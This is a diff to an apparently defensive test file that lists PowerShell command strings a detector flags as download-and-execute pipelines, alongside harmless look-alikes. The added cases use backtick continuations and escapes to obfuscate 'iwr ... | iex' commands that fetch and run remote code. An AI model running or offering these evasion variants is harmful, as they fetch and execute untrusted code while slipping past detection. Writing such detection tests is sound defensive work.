@@ -19,6 +19,13 @@ PIPE = [
     'powershell -NoProfile -Command "i`wr ' + U + ' | i`ex"',
     'pwsh -c "i`ex (i`wr ' + U + ')"',
     "c`url " + U + " | i`ex",
+    # A backtick at the end of a line continues the command on the next line.
+    "iwr " + U + " `\n| iex",
+    "iwr " + U + " |`\niex",
+    "iex `\n(iwr " + U + ")",
+    # A backtick at the start of a word or before a hyphen.
+    "iwr " + U + " | `iex",
+    "iwr " + U + " | invoke`-expression",
 ]
 BENIGN = [
     'echo "use `iwr` and `iex` in PowerShell"',
@@ -32,6 +39,9 @@ BENIGN = [
     "i`wr " + U + " | ConvertFrom-Json",
     'iex "dotnet build"',
     'i`ex "dotnet build"',
+    "iwr " + U + " `\n-OutFile a.ps1",
+    "iwr " + U + " | `ConvertFrom-Json",
+    'Write`-Host "done" | Out-File log.txt',
 ]
 
 
